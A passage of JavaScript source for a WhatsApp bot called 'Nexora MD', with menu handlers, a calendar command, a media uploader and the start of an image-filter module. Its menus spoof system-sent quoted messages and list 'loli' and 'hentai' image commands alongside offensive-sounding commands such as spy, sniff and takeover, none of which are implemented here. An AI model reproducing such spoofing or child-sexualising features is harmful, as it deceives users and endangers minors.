 *├─⌬* ${prefix}ʜᴏᴛᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ᴡᴀɪғᴜᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ᴀᴜʀᴀᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ᴄᴜᴛᴇᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}xxxᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ʙᴇᴀᴜᴛʏᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ʜᴀɴᴅsᴏᴍᴇᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ᴘʀᴇᴛᴛʏᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ᴜɢʟʏᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}sᴍᴀʀᴛᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ɢᴇɴɪᴜsᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ᴅᴜᴍʙᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ʀɪᴄʜᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ᴘᴏᴏʀᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ʟᴜᴄᴋᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ᴋɪɴᴅᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ᴇᴠɪʟᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}sɪᴍᴘᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ʟᴏʏᴀʟᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ғᴀᴋᴇᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ᴄᴏᴏʟᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ᴄʀᴀᴢʏᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ʙʀᴀᴠᴇᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ғᴇᴀʀᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ʀᴇsᴘᴇᴄᴛᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ᴘᴏᴡᴇʀᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}ᴇɴᴇʀɢʏᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}godchevk
 *├─⌬* ${prefix}ᴠɪʟʟᴀɪɴᴄʜᴇᴄᴋ
 *├─⌬* ${prefix}*truth*
 *├─⌬* ${prefix}*dare*
 *├─⌬* ${prefix}*meme*
 *├─⌬* ${prefix}*advice*
 *├─⌬* ${prefix}*meaning*
 *├─⌬* ${prefix}*quote*
 *├─⌬* ${prefix}*dadjoke*
 *├─⌬* ${prefix}*funfact*
 *├─⌬* ${prefix}*coffee*
 *├─⌬* ${prefix}*triviafact*
└─────────────────────────⬡

`;
const nexoraStyles = [
        // STYLE 1: PREMUM ORDER (Blue Badge)
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                orderMessage: {
                    itemCount: 2026,
                    status: 10,
                    surface: 10,
                    message: `𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2 𝗠𝗘𝗡𝗨`,
                    orderTitle: "NEXORA SYSTEM",
                    sellerJid: '0@s.whatsapp.net',
                    totalAmount1000: "10000000",
                    totalCurrencyCode: "USD",
                }
            }
        },
        // STYLE 2: SATELLITE LOCATION (Nigeria Core)
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                liveLocationMessage: {
                    degreesLatitude: 6.5244,
                    degreesLongitude: 3.3792,
                    caption: "🛰️ †Location Pinged †",
                    sequenceNumber: "16566",
                    jpegThumbnail: "" 
                }
            }
        },
        // STYLE 3: SYSTEM POLL (Verified Choice)
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                pollCreationMessage: {
                    name: "⚙️ ©EMPIRE TECH",
                    options: [{ optionName: "SECURE ACCESS" }, { optionName: "OPTIMIZED MODE" }],
                    selectableOptionsCount: 1
                }
            }
        }
    ];

    // 2. Pick a random style from the list above
    const pickStyle = nexoraStyles[Math.floor(Math.random() * nexoraStyles.length)];

    // 3. Send the menu with the random style
    await empire.sendMessage(m.chat, {
        image: { url: funmenuimg },
        caption: text, // Make sure your text variable is defined before this
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 1,
            isForwarded: false,
            externalAdReply: {
                showAdAttribution: true, // Fixed and working now
                title: "© †SIR DEMON†",
                body: "Powered by Empire Tech",
                mediaType: 1,
                thumbnailUrl: funmenuimg,
                sourceUrl: "https://wa.me/2349168095230",
               renderLargerThumbnail: false
            }
        }
    }, { quoted: pickStyle });

    // React to the menu call
    await empire.sendMessage(m.chat, { react: { text: '🤗', key: m.key } });
}
break;
case 'imagemenu':
case '🔟': {
const moment = require('moment-timezone');
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    // Set botMood to Neutral if it hasn't been set yet
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";

    // Greeting logic
    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
    
const menuImages = [
  'https://files.catbox.moe/wiiv8w.jpg',
        "https://files.catbox.moe/s58pbl.jpg",
        "https://files.catbox.moe/wiiv8w.jpg",
        "https://files.catbox.moe/gbvy74.jpg",
        "https://files.catbox.moe/23mm4r.jpg",
        "https://files.catbox.moe/ddnmx2.jpg",
        "https://files.catbox.moe/8ztoi3.jpg",
        "https://files.catbox.moe/r6b29s.jpg",
        'https://files.catbox.moe/2ldeiw.jpg',
        'https://files.catbox.moe/f6zv1u.jpg',
        'https://files.catbox.moe/aynz69.jpg',
        'https://files.catbox.moe/k2a5vj.jpg',
    ];

    const imagemenuimg = menuImages[Math.floor(Math.random() * menuImages.length)];
const text = `
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│*👤 Owner  : ${m.pushName}   
*│*📅 Date   : ${date}
*│*⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│*✨ *Status* : *Active*        
*│*🎭 *Mood*   : *${botMood}*
*│*🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*├──────────────────┤*
*│*🚀 Link 1 : t.me/nexoramdbot
*│*🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*
╔═════════════════════╗
║Nexora md v3 📝       
╚═════════════════════╝
┌─〔  \`People & Images\` 〕
 *├─⌬* ${prefix}*img*
 *├─⌬* ${prefix}*image*
 *├─⌬* ${prefix}*imagine*
 *├─⌬* ${prefix}*nanobanana*
 *├─⌬* ${prefix}*story-ai*
 *├─⌬* ${prefix}*img2*
 *├─⌬* ${prefix}*image2*
 *├─⌬* ${prefix}*imagine2*
 *├─⌬* ${prefix}*random-girl*
 *├─⌬* ${prefix}*hijab-girl*
 *├─⌬* ${prefix}*japan-girl*
 *├─⌬* ${prefix}*koreangirl*
 *├─⌬* ${prefix}*indonesia-girl*
 *├─⌬* ${prefix}*boypic*
 *├─⌬* ${prefix}*cbhcchhcx*
 *├─⌬* ${prefix}*loli*
 *├─⌬* ${prefix}*hentai*
 *├─⌬* ${prefix}*bluearchive*
 *├─⌬* ${prefix}*Thailand-girl*
 *├─⌬* ${prefix}*malaysia-girl*
 *├─⌬* ${prefix}*profile-pictures*
 *├─⌬* ${prefix}*tiktokgirl*
 *├─⌬* ${prefix}*vietnam-girl*
 *├─⌬* ${prefix}*cyber*
 *├─⌬* ${prefix}*carimage*
 *├─⌬* ${prefix}*cyberpunk*
 *├─⌬* ${prefix}*cybergirl*
 *├─⌬* ${prefix}*hacker*
 *├─⌬* ${prefix}*hackerwall*
 *├─⌬* ${prefix}*technology*
 *├─⌬* ${prefix}*tech*
 *├─⌬* ${prefix}*mountain*
 *├─⌬* ${prefix}*mountains*
 *├─⌬* ${prefix}*space*
 *├─⌬* ${prefix}*spacewall*
 *├─⌬* ${prefix}*islamic*
 *├─⌬* ${prefix}*islamicwall*
 *├─⌬* ${prefix}*quran*
 *├─⌬* ${prefix}*quranwall*
 *├─⌬* ${prefix}*freefire*
 *├─⌬* ${prefix}*ff*
 *├─⌬* ${prefix}*gamewallpaper*
 *├─⌬* ${prefix}*gamewall*
 *├─⌬* ${prefix}*pubg*
 *├─⌬* ${prefix}*pubgwall*
 *├─⌬* ${prefix}*wallhp*
 *├─⌬* ${prefix}*phonewallpaper*
 *├─⌬* ${prefix}*wallml*
 *├─⌬* ${prefix}*mobilelegends*
 *├─⌬* ${prefix}*wallmine*
 *├─⌬* ${prefix}*mlmine*
 *├─⌬* ${prefix}*textimg*
 *├─⌬* ${prefix}*txt2img*
 *├─⌬* ${prefix}*aitext*
 *├─⌬* ${prefix}*logo*
 *├─⌬* ${prefix}*logo2*
 *├─⌬* ${prefix}*makelogo2*
 *├─⌬* ${prefix}*gaming*
 *├─⌬* ${prefix}*gaminglogo*
 *├─⌬* ${prefix}*brat*
 *├─⌬* ${prefix}*furbrat*
 *├─⌬* ${prefix}*neon*
 *├─⌬* ${prefix}*neontext*
 *├─⌬* ${prefix}*glitch*
 *├─⌬* ${prefix}*glitchtext*
 *├─⌬* ${prefix}*glitchtext2*
 *├─⌬* ${prefix}*luxurygold*
 *├─⌬* ${prefix}*gradient*
 *├─⌬* ${prefix}*gradienttext*
 *├─⌬* ${prefix}*galaxystyle*
 *├─⌬* ${prefix}*freecreate*
 *├─⌬* ${prefix}*anime*
 *├─⌬* ${prefix}*horror*
 *├─⌬* ${prefix}*underwatertext*
 *├─⌬* ${prefix}*glowingtext*
 *├─⌬* ${prefix}*blackpinklogo*
 *├─⌬* ${prefix}*logomaker*
 *├─⌬* ${prefix}*papercutstyle*
 *├─⌬* ${prefix}*effectclouds*
 *├─⌬* ${prefix}*flagtext*
 *├─⌬* ${prefix}*cartoonstyle*
 *├─⌬* ${prefix}*blackpinkstyle*
 *├─⌬* ${prefix}*writetext*
 *├─⌬* ${prefix}*makingneon*
 *├─⌬* ${prefix}*galaxywallpaper*
 *├─⌬* ${prefix}*watercolortext*
 *├─⌬* ${prefix}*neonglitch*
 *├─⌬* ${prefix}*glitchtext*
 *├─⌬* ${prefix}*multicoloredneon*
 *├─⌬* ${prefix}*style1917*
 *├─⌬* ${prefix}*typographytext*
 *├─⌬* ${prefix}*summerbeach*
 *├─⌬* ${prefix}*sandsummer*
 *├─⌬* ${prefix}*advancedglow*
 *├─⌬* ${prefix}*blackpinklogo*
 *├─⌬* ${prefix}*deletingtext*
 *├─⌬* ${prefix}*pixelglitch*
 *├─⌬* ${prefix}*royaltext*
 *├─⌬* ${prefix}*flag3dtext*
 *├─⌬* ${prefix}*lighteffects*
 *├─⌬* ${prefix}*typographytext*
 *├─⌬* ${prefix}*scary*
└──────────────────────────⬡

`;
const nexoraStyles = [
        // STYLE 1: PREMUM ORDER (Blue Badge)
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                orderMessage: {
                    itemCount: 2026,
                    status: 10,
                    surface: 10,
                    message: `𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2 𝗠𝗘𝗡𝗨`,
                    orderTitle: "NEXORA SYSTEM",
                    sellerJid: '0@s.whatsapp.net',
                    totalAmount1000: "10000000",
                    totalCurrencyCode: "USD",
                }
            }
        },
        // STYLE 2: SATELLITE LOCATION (Nigeria Core)
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                liveLocationMessage: {
                    degreesLatitude: 6.5244,
                    degreesLongitude: 3.3792,
                    caption: "🛰️ †Location Pinged †",
                    sequenceNumber: "16566",
                    jpegThumbnail: "" 
                }
            }
        },
        // STYLE 3: SYSTEM POLL (Verified Choice)
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                pollCreationMessage: {
                    name: "⚙️ ©EMPIRE TECH",
                    options: [{ optionName: "SECURE ACCESS" }, { optionName: "OPTIMIZED MODE" }],
                    selectableOptionsCount: 1
                }
            }
        }
    ];

    // 2. Pick a random style from the list above
    const pickStyle = nexoraStyles[Math.floor(Math.random() * nexoraStyles.length)];

    // 3. Send the menu with the random style
    await empire.sendMessage(m.chat, {
        image: { url: imagemenuimg },
        caption: text, // Make sure your menuText variable is defined before this
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 1,
            isForwarded: false,
            externalAdReply: {
                showAdAttribution: true, // Fixed and working now
                title: "© †SIR DEMON†",
                body: "Powered by Empire Tech",
                mediaType: 1,
                thumbnailUrl: imagemenuimg,
                sourceUrl: "https://wa.me/2349168095230",
               renderLargerThumbnail: false
            }
        }
    }, { quoted: pickStyle });

    // React to the menu call
    await empire.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } });
}
break;

case 'voicemenu': {
const moment = require('moment-timezone');
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    // Set botMood to Neutral if it hasn't been set yet
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";

    // Greeting logic
    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
    
const menuImages = [
  'https://files.catbox.moe/wiiv8w.jpg',
        "https://files.catbox.moe/s58pbl.jpg",
        "https://files.catbox.moe/wiiv8w.jpg",
        "https://files.catbox.moe/gbvy74.jpg",
        "https://files.catbox.moe/23mm4r.jpg",
        "https://files.catbox.moe/ddnmx2.jpg",
        "https://files.catbox.moe/8ztoi3.jpg",
        "https://files.catbox.moe/r6b29s.jpg",
        'https://files.catbox.moe/2ldeiw.jpg',
        'https://files.catbox.moe/f6zv1u.jpg',
        'https://files.catbox.moe/aynz69.jpg',
        'https://files.catbox.moe/k2a5vj.jpg',
    ];

    const voicemenuimg = menuImages[Math.floor(Math.random() * menuImages.length)];
const text = `
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│*👤 Owner  : ${m.pushName}   
*│*📅 Date   : ${date}
*│*⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│*✨ *Status* : *Active*        
*│*🎭 *Mood*   : *${botMood}*
*│*🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*├──────────────────┤*
*│*🚀 Link 1 : t.me/nexoramdbot
*│*🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*
╔═════════════════════╗
║Nexora md v3 📝       
╚═════════════════════╝
┌─〔  \`Voice Menu\` 〕
 *├─⌬* ${prefix}bass
 *├─⌬* ${prefix}treble
 *├─⌬* ${prefix}deep
 *├─⌬* ${prefix}robot
 *├─⌬* ${prefix}slow
 *├─⌬* ${prefix}fast
 *├─⌬* ${prefix}vocalremove
 *├─⌬* ${prefix}instrumenta
 *├─⌬* ${prefix}reverse
 *├─⌬* ${prefix}nightcore
 *├─⌬* ${prefix}chipmunk
 *├─⌬* ${prefix}earrape
 *├─⌬* ${prefix}*fast*
 *├─⌬* ${prefix}*earrape*
└──────────────────────────⬡

`;
const nexoraStyles = [
        // STYLE 1: PREMUM ORDER (Blue Badge)
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                orderMessage: {
                    itemCount: 2026,
                    status: 10,
                    surface: 10,
                    message: `𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2 𝗠𝗘𝗡𝗨`,
                    orderTitle: "NEXORA SYSTEM",
                    sellerJid: '0@s.whatsapp.net',
                    totalAmount1000: "10000000",
                    totalCurrencyCode: "USD",
                }
            }
        },
        // STYLE 2: SATELLITE LOCATION (Nigeria Core)
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                liveLocationMessage: {
                    degreesLatitude: 6.5244,
                    degreesLongitude: 3.3792,
                    caption: "🛰️ †Location Pinged †",
                    sequenceNumber: "16566",
                    jpegThumbnail: "" 
                }
            }
        },
        // STYLE 3: SYSTEM POLL (Verified Choice)
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                pollCreationMessage: {
                    name: "⚙️ ©EMPIRE TECH",
                    options: [{ optionName: "SECURE ACCESS" }, { optionName: "OPTIMIZED MODE" }],
                    selectableOptionsCount: 1
                }
            }
        }
    ];

    // 2. Pick a random style from the list above
    const pickStyle = nexoraStyles[Math.floor(Math.random() * nexoraStyles.length)];

    // 3. Send the menu with the random style
    await empire.sendMessage(m.chat, {
        image: { url: voicemenuimg },
        caption: text, // Make sure your menuText variable is defined before this
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 1,
            isForwarded: false,
            externalAdReply: {
                showAdAttribution: true, // Fixed and working now
                title: "© †SIR DEMON†",
                body: "Powered by Empire Tech",
                mediaType: 1,
                thumbnailUrl: voicemenuimg,
                sourceUrl: "https://wa.me/2349168095230",
               renderLargerThumbnail: false
            }
        }
    }, { quoted: pickStyle });

    // React to the menu call
    await empire.sendMessage(m.chat, { react: { text: '🗣️', key: m.key } });
}
break;



case 'cybermenu': {
const moment = require('moment-timezone');
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    // Set botMood to Neutral if it hasn't been set yet
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";

    // Greeting logic
    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
    
const menuImages = [
  'https://files.catbox.moe/wiiv8w.jpg',
        "https://files.catbox.moe/s58pbl.jpg",
        "https://files.catbox.moe/wiiv8w.jpg",
        "https://files.catbox.moe/gbvy74.jpg",
        "https://files.catbox.moe/23mm4r.jpg",
        "https://files.catbox.moe/ddnmx2.jpg",
        "https://files.catbox.moe/8ztoi3.jpg",
        "https://files.catbox.moe/r6b29s.jpg",
        'https://files.catbox.moe/2ldeiw.jpg',
        'https://files.catbox.moe/f6zv1u.jpg',
        'https://files.catbox.moe/aynz69.jpg',
        'https://files.catbox.moe/k2a5vj.jpg',
    ];

    const cybermenuimg = menuImages[Math.floor(Math.random() * menuImages.length)];
const text = ` 
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│*👤 Owner  : ${m.pushName}   
*│*📅 Date   : ${date}
*│*⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│*✨ *Status* : *Active*        
*│*🎭 *Mood*   : *${botMood}*
*│*🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*├──────────────────┤*
*│*🚀 Link 1 : t.me/nexoramdbot
*│*🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*
-❐━━━━━━━━━━━━━━━━━━◥◣
> ⬟ᴛʜᴇᴍᴇ : sᴀᴛᴏʀᴜ x ɪᴛᴀᴄʜɪ
◥◣━━━━━━━━━━━━━━━━━━-❐
┌─〔 \`NEXORA-CYBER VILLA🛰️\` 〕
 *├─⌬* ${prefix}*satview*
 *├─⌬* ${prefix}*spy*
 *├─⌬* ${prefix}*dns*
 *├─⌬* ${prefix}*airtraffic*
 *├─⌬* ${prefix}*shell*
 *├─⌬* ${prefix}*saveweb*
 *├─⌬* ${prefix}*web2zip*
 *├─⌬* ${prefix}*flights*
 *├─⌬* ${prefix}*headers*
 *├─⌬* ${prefix}*audit*
 *├─⌬* ${prefix}*hostinfo*
 *├─⌬* ${prefix}*nodes*
 *├─⌬* ${prefix}*proxycheck*
 *├─⌬* ${prefix}*vpncheck*
 *├─⌬* ${prefix}*cve*
 *├─⌬* ${prefix}*tracepath*
 *├─⌬* ${prefix}*nodemap*
 *├─⌬* ${prefix}*monitor*
 *├─⌬* ${prefix}*sniff*
 *├─⌬* ${prefix}*checklink*
 *├─⌬* ${prefix}*detect*
 *├─⌬* ${prefix}*ssl*
 *├─⌬* ${prefix}*cert*
 *├─⌬* ${prefix}*trace*
 *├─⌬* ${prefix}*traceroute*
 *├─⌬* ${prefix}*operations*
 *├─⌬* ${prefix}*scrape*
 *├─⌬* ${prefix}*intel*
 *├─⌬* ${prefix}*sentinel*
 *├─⌬* ${prefix}*adminfinder*
 *├─⌬* ${prefix}*takeover*
 *├─⌬* ${prefix}*reverseip*
 *├─⌬* ${prefix}*hashid*
 *├─⌬* ${prefix}*revip*
└──────────────────────────⬡

`;
const nexoraStyles = [
        // STYLE 1: PREMUM ORDER (Blue Badge)
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                orderMessage: {
                    itemCount: 2026,
                    status: 10,
                    surface: 10,
                    message: `𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2 𝗠𝗘𝗡𝗨`,
                    orderTitle: "NEXORA SYSTEM",
                    sellerJid: '0@s.whatsapp.net',
                    totalAmount1000: "10000000",
                    totalCurrencyCode: "USD",
                }
            }
        },
        // STYLE 2: SATELLITE LOCATION (Nigeria Core)
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                liveLocationMessage: {
                    degreesLatitude: 6.5244,
                    degreesLongitude: 3.3792,
                    caption: "🛰️ †Location Pinged †",
                    sequenceNumber: "16566",
                    jpegThumbnail: "" 
                }
            }
        },
        // STYLE 3: SYSTEM POLL (Verified Choice)
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                pollCreationMessage: {
                    name: "⚙️ ©EMPIRE TECH",
                    options: [{ optionName: "SECURE ACCESS" }, { optionName: "OPTIMIZED MODE" }],
                    selectableOptionsCount: 1
                }
            }
        }
    ];

    // 2. Pick a random style from the list above
    const pickStyle = nexoraStyles[Math.floor(Math.random() * nexoraStyles.length)];

    // 3. Send the menu with the random style
    await empire.sendMessage(m.chat, {
        image: { url: cybermenuimg },
        caption: text, // Make sure your menuText variable is defined before this
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 1,
            isForwarded: false,
            externalAdReply: {
                showAdAttribution: true, // Fixed and working now
                title: "© †SIR DEMON†",
                body: "Powered by Empire Tech",
                mediaType: 1,
                thumbnailUrl: cybermenuimg,
                sourceUrl: "https://wa.me/2349168095230",
               renderLargerThumbnail: false
            }
        }
    }, { quoted: pickStyle });

    // React to the menu call
    await empire.sendMessage(m.chat, { react: { text: '📟', key: m.key } });
}
break;


case 'calendar':
case 'cal': {
     if (!isCreator) return;
    await empire.sendMessage(m.chat, { react: { text: '🗓️', key: m.key } });
    
    try {
        const calBuffer = await drawCalendar();
        const dateString = new Date().toLocaleDateString('en-GB', { 
            weekday: 'long', day: 'numeric', month: 'long' 
        });

        await empire.sendMessage(m.chat, { 
            image: calBuffer, 
            caption: `📅 *NEXORA DIGITAL CALENDAR*\n\nToday is: *${dateString}*\n\nKeep track of your schedule! 🚀` 
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        reply("❌ Could not generate calendar. Check canvas setup.");
    }
}
break;



case 'tourl':
case 'url': {
    const fs = require('fs');
    const path = require('path');
    const { UploadFileUgu, TelegraPh } = require('../lib/uploader');

    // Helper function to extract stream directly from message
    const getMediaBufferAndExt = async (msgObj) => {
        const msg = msgObj.message || {};
        if (msg.imageMessage) {
            const stream = await downloadContentFromMessage(msg.imageMessage, 'image');
            const chunks = []; for await (const chunk of stream) chunks.push(chunk);
            return { buffer: Buffer.concat(chunks), ext: '.jpg' };
        }
        if (msg.videoMessage) {
            const stream = await downloadContentFromMessage(msg.videoMessage, 'video');
            const chunks = []; for await (const chunk of stream) chunks.push(chunk);
            return { buffer: Buffer.concat(chunks), ext: '.mp4' };
        }
        if (msg.audioMessage) {
            const stream = await downloadContentFromMessage(msg.audioMessage, 'audio');
            const chunks = []; for await (const chunk of stream) chunks.push(chunk);
            return { buffer: Buffer.concat(chunks), ext: '.mp3' };
        }
        if (msg.documentMessage) {
            const stream = await downloadContentFromMessage(msg.documentMessage, 'document');
            const chunks = []; for await (const chunk of stream) chunks.push(chunk);
            const fileName = msg.documentMessage.fileName || 'file.bin';
            return { buffer: Buffer.concat(chunks), ext: path.extname(fileName) || '.bin' };
        }
        if (msg.stickerMessage) {
            const stream = await downloadContentFromMessage(msg.stickerMessage, 'sticker');
            const chunks = []; for await (const chunk of stream) chunks.push(chunk);
            return { buffer: Buffer.concat(chunks), ext: '.webp' };
        }
        return null;
    };

    // Grab media from the message or the quoted message
    let media = await getMediaBufferAndExt(m);
    if (!media && m.quoted) {
        media = await getMediaBufferAndExt({ message: m.quoted });
    }

    if (!media) return reply('❌ Send or reply to a media file (image, video, audio, sticker, document) to get a live URL.');

    await empire.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    const tempDir = path.join(__dirname, '../temp');
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
    const tempPath = path.join(tempDir, `${Date.now()}${media.ext}`);
    fs.writeFileSync(tempPath, media.buffer);

    let uploadedUrl = '';
    try {
        if (['.jpg', '.png', '.webp'].includes(media.ext)) {
            try {
                uploadedUrl = await TelegraPh(tempPath);
            } catch {
                const res = await UploadFileUgu(tempPath);
                uploadedUrl = typeof res === 'string' ? res : (res.url || res.url_full);
            }
        } else {
            const res = await UploadFileUgu(tempPath);
            uploadedUrl = typeof res === 'string' ? res : (res.url || res.url_full);
        }
    } finally {
        setTimeout(() => {
            try { if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath); } catch {}
        }, 2000);
    }

    if (!uploadedUrl) return reply('❌ Failed to upload media to the hosting CDN panels.');
    
    reply(`🔗 *MEDIA URL GENERATED*\n\n${uploadedUrl}`);
}
break;
case 'misc': {
    const axios = require('axios');
    const FormData = require('form-data');
    const FileType = require('file-type');
    const fs = require('fs');
    const path = require('path');

    const subCommand = (args[0] || '').toLowerCase();
    const remainingArgs = args.slice(1);

    // --- HELPER 1: Dynamic Image CDN Upload Function ---
    const localImageUploader = async (imgBuffer) => {
        try {
            const tmpDir = path.join(process.cwd(), 'tmp');
            if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });

            const fileType = await FileType.fromBuffer(imgBuffer);
            const { ext, mime } = fileType || { ext: 'png', mime: 'image/png' };
            const tempFile = path.join(tmpDir, `temp_${Date.now()}.${ext}`);

            fs.writeFileSync(tempFile, imgBuffer);

            const form = new FormData();
            form.append('files[]', fs.createReadStream(tempFile));

            const response = await axios.post('https://qu.ax/upload.php', form, {
                headers: form.getHeaders(),
                timeout: 15000
            });

            try { fs.unlinkSync(tempFile); } catch {}

            if (response.data && response.data.success) {
                return response.data.files[0].url;
            } else {
                throw new Error('Primary CDN fallback trigger');
            }
        } catch {
            // Fallback directly to telegraph if qu.ax times out
            const fileType = await FileType.fromBuffer(imgBuffer);
            const { ext, mime } = fileType || { ext: 'png', mime: 'image/png' };
            
            const tgForm = new FormData();
            tgForm.append('file', imgBuffer, { filename: `upload.${ext}`, contentType: mime });

            const tgRes = await axios.post('https://telegra.ph/upload', tgForm, {
                headers: tgForm.getHeaders()
            });

            if (tgRes.data && tgRes.data[0]?.src) {
                return 'https://telegra.ph' + tgRes.data[0].src;
            }
            return 'https://i.imgur.com/2wzGhpF.png'; // Universal fallback avatar anchor
        }
    };

    // --- HELPER 2: Quoted, Message, or Profile Avatar Extractor ---
    const getAvatarUrlMatrix = async () => {
        // A) Check for a quoted image message
        if (m.quoted && m.quoted.mtype === 'imageMessage') {
            const fakeObj = { message: { imageMessage: m.quoted } };
            const buffer = await downloadAndSaveMediaMessage(fakeObj, 'buffer');
            return await localImageUploader(buffer);
        }
        // B) Check current message media context
        if (m.message?.imageMessage) {
            const buffer = await downloadAndSaveMediaMessage(m, 'buffer');
            return await localImageUploader(buffer);
        }
        // C) Fallback to target participant profile picture routing
        let targetJid;
        const ctx = m.message?.extendedTextMessage?.contextInfo;
        if (ctx?.mentionedJid?.length > 0) {
            targetJid = ctx.mentionedJid[0];
        } else if (ctx?.participant) {
            targetJid = ctx.participant;
        } else {
            targetJid = m.sender || m.chat;
        }

        try {
            return await empire.profilePictureUrl(targetJid, 'image');
        } catch {
            return 'https://i.imgur.com/2wzGhpF.png';
        }
    };

    // --- MAIN ENGINE ROUTER ---
    if (!subCommand) {
        return reply(`💡 *NEXORA CANVAS MISC MODULES*\n\n*Usage:* ${prefix + command} [sub-command]\n\n*Simple Overlays:* \n• heart, horny, circle, lgbt, lied, lolice, simpcard, tonikawa, comrade, gay, glass, jail, passed, triggered\n\n*Advanced Renderers:* \n• its-so-stupid [text]\n• oogway [text]\n• tweet [name|user|text|theme]\n• youtube-comment [user|text]`);
    }

    // List of simple canvas filters that only require an avatar target
    const avatarOnlyFilters = [
        'heart', 'horny', 'circle', 'lgbt', 'lied', 'lolice', 'simpcard', 'tonikawa',
        'comrade', 'gay', 'glass', 'jail', 'passed', 'triggered'
